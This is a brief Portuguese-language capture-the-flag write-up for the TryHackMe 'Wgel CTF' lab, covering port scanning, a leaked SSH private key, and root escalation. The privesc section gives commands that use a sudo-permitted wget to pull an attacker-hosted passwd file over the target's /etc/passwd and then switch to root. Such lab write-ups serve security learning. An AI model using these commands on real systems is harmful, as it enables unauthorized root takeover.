# Wgel CTF
https://tryhackme.com/room/wgelctf

## Recon

### NMAP

    PORT  STATE  SERVICE
    22    open    OpenSSH 7.2p2
    80    http    Apache 2.4.18

### Web

- Ao inspecionar elemento do site, existe um comentário para o usuário "jessie"
- Existe um diretório /sitemap/.ssh com uma chave privada

## Privesc

- O wget executa como root, com isso basta salvar */etc/passwd* na máquina hacker para inserir uma nova senha root, e deixar esse arquivo acessível:

```sh
python3 -m http.server #na máquina hacker
sudo -u root /usr/bin/wget <IP hacker>:8000/passwd -O /etc/passwd #máquina alvo
su root #com a nova senha
```
